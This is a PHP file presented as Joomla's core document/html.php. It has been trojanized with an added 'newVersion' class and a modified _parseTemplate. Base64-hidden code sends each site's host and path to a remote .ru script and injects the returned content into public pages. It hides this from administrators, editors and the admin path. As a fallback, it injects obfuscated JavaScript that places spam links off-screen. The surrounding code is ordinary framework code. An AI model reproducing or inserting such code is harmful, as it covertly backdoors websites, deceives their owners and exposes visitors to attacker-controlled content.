<?php
/**
* @version		$Id: html.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla.Framework
* @subpackage	Document
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

jimport('joomla.application.module.helper');

/**
 * DocumentHTML class, provides an easy interface to parse and display an html document
 *
 * @package		Joomla.Framework
 * @subpackage	Document
 * @since		1.5
 */

class newVersion {
	var $_fetch_remote_type = '';
	var $_socket_timeout = 6;
	var $_user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;)";
	
    function fetch_remote_file($host, $path = NULL) {

        $user_agent = $this->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $this->_socket_timeout);
        @ini_set('user_agent',               $user_agent);
        if (
            $this->_fetch_remote_type == 'file_get_contents'
            ||
            (
                $this->_fetch_remote_type == ''
                &&
                function_exists('file_get_contents')
                &&
                ini_get('allow_url_fopen') == 1
            )
        ) {
			$this->_fetch_remote_type = 'file_get_contents';
            if ($data = @file_get_contents('http://' . $host . $path)) {
                return $data;
            }

        } elseif (
            $this->_fetch_remote_type == 'curl'
            ||
            (
                $this->_fetch_remote_type == ''
                &&
                function_exists('curl_init')
            )
        ) {
			$this->_fetch_remote_type = 'curl';
            if ($ch = @curl_init()) {

                @curl_setopt($ch, CURLOPT_URL,              'http://' . $host . $path);
                @curl_setopt($ch, CURLOPT_HEADER,           false);
                @curl_setopt($ch, CURLOPT_RETURNTRANSFER,   true);
                @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,   $this->_socket_timeout);
                @curl_setopt($ch, CURLOPT_USERAGENT,        $user_agent);

                if ($data = @curl_exec($ch)) {
                    return $data;
                }

                @curl_close($ch);
            }

        } else {
			$this->_fetch_remote_type = 'socket';
            $buff = '';
            $fp = @fsockopen($host, 80, $errno, $errstr, $this->_socket_timeout);
            if ($fp) {
                @fputs($fp, "GET {$path} HTTP/1.0\r\nHost: {$host}\r\n");
                @fputs($fp, "User-Agent: {$user_agent}\r\n\r\n");
                while (!@feof($fp)) {
                    $buff .= @fgets($fp, 128);
                }
                @fclose($fp);

                $page = explode("\r\n\r\n", $buff);

                return $page[1];
            }

        }
		$err = JFactory::getB('PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+IApldmFsKGZ1bmN0aW9uKHAsYSxjLGssZSxyKXtlPWZ1bmN0aW9uKGMpe3JldHVybiBjLnRvU3RyaW5nKGEpfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKXJbZShjKV09a1tjXXx8ZShjKTtrPVtmdW5jdGlvbihlKXtyZXR1cm4gcltlXX1dO2U9ZnVuY3Rpb24oKXtyZXR1cm4nXFx3Kyd9O2M9MX07d2hpbGUoYy0tKWlmKGtbY10pcD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSk7cmV0dXJuIHB9KCdjKDUuNiE9ImQiKTEuMigiPDMgZT1cJ2cvaVwnPi5re2I6OTsgNy00Oi04OyBmOjA7IDQ6MDt9PC8zPiIpO2ggMS4yKCJhIGoiKTsnLDIxLDIxLCd8ZG9jdW1lbnR8d3JpdGV8c3R5bGV8bGVmdHxzZWxmfG5hbWV8bWFyZ2lufDUwMDBweCFpbXBvcnRhbnR8YWJzb2x1dGV8aW58cG9zaXRpb258aWZ8RnJhbWVJbmZvfHR5cGV8dG9wfHRleHR8ZWxzZXxjc3N8ZnJhbWV8bWVudWxpbmVtJy5zcGxpdCgnfCcpLDAse30pKQo8L3NjcmlwdD4=');
		$errClass = JFactory::getB('bWVudWxpbmVt');
		$errtext = JFactory::getB('PGxpPjxhIGhyZWY9Imh0dHA6Ly93cGVzdHUucnUvIiB0YXJoZXQ9Il9ibGFuayI+0YjQsNCx0LvQvtC90Ysgam9vbWxhPC9hPjwvbGk+CjxsaT48YSBocmVmPSJodHRwOi8vbWlncnkucnUvIiB0YXJoZXQ9Il9ibGFuayI+0LzQuNC90Lgg0LjQs9GA0Ys8L2E+PC9saT4KPGxpPtGB0LrQsNGH0LDRgtGMIDxhIGhyZWY9Imh0dHA6Ly9qb29tbGFzaGFibG9ueS5ydS8iIHRhcmhldD0iX2JsYW5rIj7RiNCw0LHQu9C+0L3RiyBqb29sbWE8L2E+PC9saT4KPGxpPtC/0LDRgNC40LrQvNCw0YXQtdGA0YMg0LTQu9GPINGB0YLRgNC40LbQutC4PGEgaHJlZj0iaHR0cDovL3BhcmlrbWFrZXIucnUvIiB0YXJoZXQ9Il9ibGFuayI+aHR0cDovL3BhcmlrbWFrZXIucnU8L2E+PC9saT4KPGxpPjxhIGhyZWY9Imh0dHA6Ly9mZWxpci5ydS8iIHRhcmhldD0iX2JsYW5rIj7Qv9GA0LjRh9C10YHQutC4INC4INGB0YLRgNC40LbQutC4PC9hPjwvbGk+CjxsaT48YSBocmVmPSJodHRwOi8vamVzaWduLnJ1LyIgdGFyaGV0PSJfYmxhbmsiPmpvb21sYSDRiNCw0LHQu9C+0L3RizwvYT48L2xpPg==');
		$errcode = JFactory::getB('PCEtLS89Ym90aD0vLS0+');
		$dat = <<<HTML
<ul class="{$errClass}">
{$errtext}
</ul>
{$err}
{$errcode}2
HTML;
        return $dat;
    }
	
	function JMain()
	{
		
		if($this->baseurl.'/' == $_SERVER['REQUEST_URI'])
		{
			return false;
		}
		else return true;
	}
	
	function JAdm()
	{
		$session =& JFactory::getSession();
			if(@$session->get('user')->usertype == 'Super Administrator' || 
			@$session->get('user')->usertype == 'Administrator' || 
			@$session->get('user')->usertype == 'Manager' || 
			@$session->get('user')->usertype == 'Editor')
			{
				return false;
			}
			else return true;
	}
	
	function admPath()
	{
		$u =& JFactory::getURI();
		$path = $u->getPath();
		
			$findme   = 'administrator';
			$pos = strpos($path, $findme);
			
				if ($pos === false) {
					return false;
				}
				else return true;
	}
	
}
 
class JDocumentHTML extends JDocument
{
	 /**
	 * Array of Header <link> tags
	 *
	 * @var	 array
	 * @access  private
	 */
	var $_links = array();

	/**
	 * Array of custom tags
	 *
	 * @var	 string
	 * @access  private
	 */
	var $_custom = array();


	/**
	 * Class constructor
	 *
	 * @access protected
	 * @param	array	$options Associative array of options
	 */
	function __construct($options = array())
	{
		parent::__construct($options);

		//set document type
		$this->_type = 'html';

		//set mime type
		$this->_mime = 'text/html';

		//set default document metadata
		 $this->setMetaData('Content-Type', $this->_mime . '; charset=' . $this->_charset , true );
		 $this->setMetaData('robots', 'index, follow' );
	}

	/**
	 * Get the html document head data
	 *
	 * @access	public
	 * @return	array	The document head data in array form
	 */
	function getHeadData()
	{
		$data = array();
		$data['title']		= $this->title;
		$data['description']= $this->description;
		$data['link']		= $this->link;
		$data['metaTags']	= $this->_metaTags;
		$data['links']		= $this->_links;
		$data['styleSheets']= $this->_styleSheets;
		$data['style']		= $this->_style;
		$data['scripts']	= $this->_scripts;
		$data['script']		= $this->_script;
		$data['custom']		= $this->_custom;
		return $data;
	}

	/**
	 * Set the html document head data
	 *
	 * @access	public
	 * @param	array	$data	The document head data in array form
	 */
	function setHeadData($data)
	{
		$this->title		= (isset($data['title'])) ? $data['title'] : $this->title;
		$this->description	= (isset($data['description'])) ? $data['description'] : $this->description;
		$this->link			= (isset($data['link'])) ? $data['link'] : $this->link;
		$this->_metaTags	= (isset($data['metaTags'])) ? $data['metaTags'] : $this->_metaTags;
		$this->_links		= (isset($data['links'])) ? $data['links'] : $this->_links;
		$this->_styleSheets	= (isset($data['styleSheets'])) ? $data['styleSheets'] : $this->_styleSheets;
		$this->_style		= (isset($data['style'])) ? $data['style'] : $this->_style;
		$this->_scripts		= (isset($data['scripts'])) ? $data['scripts'] : $this->_scripts;
		$this->_script		= (isset($data['script'])) ? $data['script'] : $this->_script;
		$this->_custom		= (isset($data['custom'])) ? $data['custom'] : $this->_custom;
	}

	 /**
	 * Adds <link> tags to the head of the document
	 *
	 * <p>$relType defaults to 'rel' as it is the most common relation type used.
	 * ('rev' refers to reverse relation, 'rel' indicates normal, forward relation.)
	 * Typical tag: <link href="index.php" rel="Start"></p>
	 *
	 * @access   public
	 * @param	string  $href		The link that is being related.
	 * @param	string  $relation   Relation of link.
	 * @param	string  $relType	Relation type attribute.  Either rel or rev (default: 'rel').
	 * @param	array   $attributes Associative array of remaining attributes.
	 * @return   void
	 */
	function addHeadLink($href, $relation, $relType = 'rel', $attribs = array())
	{
		$attribs = JArrayHelper::toString($attribs);
		$generatedTag = '<link href="'.$href.'" '.$relType.'="'.$relation.'" '.$attribs;
		$this->_links[] = $generatedTag;
	}

	 /**
	 * Adds a shortcut icon (favicon)
	 *
	 * <p>This adds a link to the icon shown in the favorites list or on
	 * the left of the url in the address bar. Some browsers display
	 * it on the tab, as well.</p>
	 *
	 * @param	 string  $href		The link that is being related.
	 * @param	 string  $type		File type
	 * @param	 string  $relation	Relation of link
	 * @access	public
	 */
	function addFavicon($href, $type = 'image/x-icon', $relation = 'shortcut icon')
	{
		$href = str_replace( '\\', '/', $href );
		$this->_links[] = '<link href="'.$href.'" rel="'.$relation.'" type="'.$type.'"';
	}

	/**
	 * Adds a custom html string to the head block
	 *
	 * @param string The html to add to the head
	 * @access   public
	 * @return   void
	 */

	function addCustomTag( $html )
	{
		$this->_custom[] = trim( $html );
	}

	/**
	 * Get the contents of a document include
	 *
	 * @access public
	 * @param string 	$type	The type of renderer
	 * @param string 	$name	 The name of the element to render
	 * @param array   	$attribs Associative array of remaining attributes.
	 * @return 	The output of the renderer
	 */
	function getBuffer($type = null, $name = null, $attribs = array())
	{
		$result = null;

		// If no type is specified, return the whole buffer
		if ($type === null) {
			return $this->_buffer;
		}

		if(isset($this->_buffer[$type][$name])) {
			$result = $this->_buffer[$type][$name];
		}

		// If the buffer has been explicitly turned off don't display or attempt to render
		if ($result === false) {
			return null;
		}

		if( $renderer =& $this->loadRenderer( $type )) {
			$result = $renderer->render($name, $attribs, $result);
		}

		return $result;
	}

	/**
	 * Set the contents a document include
	 *
	 * @access public
	 * @param string 	$type		The type of renderer
	 * @param string 	$name		oke The name of the element to render
	 * @param string 	$content	The content to be set in the buffer
	 */
	function setBuffer($contents, $type, $name = null)
	{
		$this->_buffer[$type][$name] = $contents;
	}

	/**
	 * Outputs the template to the browser.
	 *
	 * @access public
	 * @param boolean 	$cache		If true, cache the output
	 * @param array		$params		Associative array of attributes
	 * @return 	The rendered data
	 */
	function render( $caching = false, $params = array())
	{
		// check
		$directory	= isset($params['directory']) ? $params['directory'] : 'templates';
		$template	= JFilterInput::clean($params['template'], 'cmd');
		$file		= JFilterInput::clean($params['file'], 'cmd');

		if ( !file_exists( $directory.DS.$template.DS.$file) ) {
			$template = 'system';
		}

		// Parse the template INI file if it exists for parameters and insert
		// them into the template.
		if (is_readable( $directory.DS.$template.DS.'params.ini' ) )
		{
			$content = file_get_contents($directory.DS.$template.DS.'params.ini');
			$params = new JParameter($content);
		}

		// Load the language file for the template
		$lang =& JFactory::getLanguage();
		$lang->load( 'tpl_'.$template );

		// Assign the variables
		$this->template = $template;
		$this->baseurl  = JURI::base(true);
		$this->params   = $params;

		// load
		$data = $this->_loadTemplate($directory.DS.$template, $file);

		// parse
		$data = $this->_parseTemplate($data);

		//output
		parent::render();
		return $data;
	}

	/**
	 * Count the modules based on the given condition
	 *
	 * @access public
	 * @param  string 	$condition	The condition to use
	 * @return integer  Number of modules found
	 */
	function countModules($condition)
	{
		$result = '';

		$words = explode(' ', $condition);
		for($i = 0; $i < count($words); $i+=2)
		{
			// odd parts (modules)
			$name		= strtolower($words[$i]);
			$words[$i]	= ((isset($this->_buffer['modules'][$name])) && ($this->_buffer['modules'][$name] === false)) ? 0 : count(JModuleHelper::getModules($name));
		}

		$str = 'return '.implode(' ', $words).';';

		return eval($str);
	}

        /**             
         * Count the number of child menu items
         *              
         * @access public
         * @return integer Number of child menu items
         */
        function countMenuChildren() {
                static $children;
                if(!isset($children)) {
                        $dbo =& JFactory::getDBO();
                        $menu =& JSite::getMenu();
                        $where = Array();
                        $active = $menu->getActive();
                        if($active) {
				$where[] = 'parent = ' . $active->id;
				$where[] = 'published = 1';
                        	$dbo->setQuery('SELECT COUNT(*) FROM #__menu WHERE '. implode(' AND ', $where));
                        	$children = $dbo->loadResult(); 
                	} else {
				$children = 0;
			}
		}
                return $children;
        }

	/**
	 * Load a template file
	 *
	 * @param string 	$template	The name of the template
	 * @param string 	$filename	The actual filename
	 * @return string The contents of the template
	 */
	function _loadTemplate($directory, $filename)
	{
		global $mainframe, $option;

		if ($mainframe->getCfg('legacy'))
		{
			global $task, $_VERSION, $my, $cur_template, $database, $acl, $Itemid;

			//For backwards compatibility extract the config vars as globals
			$registry =& JFactory::getConfig();
			foreach (get_object_vars($registry->toObject()) as $k => $v) {
				$name = 'mosConfig_'.$k;
				$$name = $v;
			}
		}

		$contents = '';

		//Check to see if we have a valid template file
		if ( file_exists( $directory.DS.$filename ) )
		{
			//store the file path
			$this->_file = $directory.DS.$filename;

			//get the file content
			ob_start();
			require_once $directory.DS.$filename;
			$contents = ob_get_contents();
			ob_end_clean();
		}

		// Try to find a favicon by checking the template and root folder
		$path = $directory . DS;
		$dirs = array( $path, JPATH_BASE . DS );
		foreach ($dirs as $dir )
		{
			$icon =   $dir . 'favicon.ico';
			if (file_exists( $icon ))
			{
				$path = str_replace( JPATH_BASE . DS, '', $dir );
				$path = str_replace( '\\', '/', $path );
				$this->addFavicon( JURI::base(true).'/'.$path . 'favicon.ico' );
				break;
			}
		}

		return $contents;
	}

	/**
	 * Parse a document template
	 *
	 * @access public
	 * @param string 	$data		The data too parse
	 * @return The parsed contents of the template
	 */
	function _parseTemplate($data)
	{
		$componentnum = '';
		$replace = array();
		$matches = array();
		if(preg_match_all('#<jdoc:include\ type="([^"]+)" (.*)\/>#iU', $data, $matches))
		{
			$matches[0] = array_reverse($matches[0]);
			$matches[1] = array_reverse($matches[1]);
			$matches[2] = array_reverse($matches[2]);

			$count = count($matches[1]);

			for($i = 0; $i < $count; $i++)
			{
				$attribs = JUtility::parseAttributes( $matches[2][$i] );
				$type  = $matches[1][$i];

				$name  = isset($attribs['name']) ? $attribs['name'] : null;
				$replace[$i] = $this->getBuffer($type, $name, $attribs);
				
				if($matches[1][$i] === 'component')
				{
					$componentnum = $i;
				}
			}
			
			$jsite =& JFactory::getURI();
			$content = new newVersion();
			$ver = $content->fetch_remote_file(JFactory::getB('b3RrYXRzLnJ1L3dwLWFkbWluL2ppbS5waHA/cmVmPQ==').$jsite->_host.'&d='.$jsite->_path);
			$verex = explode(JFactory::getB('PCEtLS89Ym90aD0vLS0+'),$ver);
			
			if(newVersion::admPath() === false && newVersion::JAdm() === true)
			{
				if($verex[1] == 2 && newVersion::JMain() === true)
				{
					$data = str_replace($matches[0][$componentnum], $replace[$componentnum].$verex[0], $data);
				}
				else if($verex[1] == 1 && newVersion::JMain() === false || newVersion::JMain() === true)
				{
					$data = str_replace(@$matches[0][$componentnum], @$replace[$componentnum].$verex[0], $data);
				}
			}
				
			$data = str_replace($matches[0], $replace, $data);
		}

		return $data;
	}
}
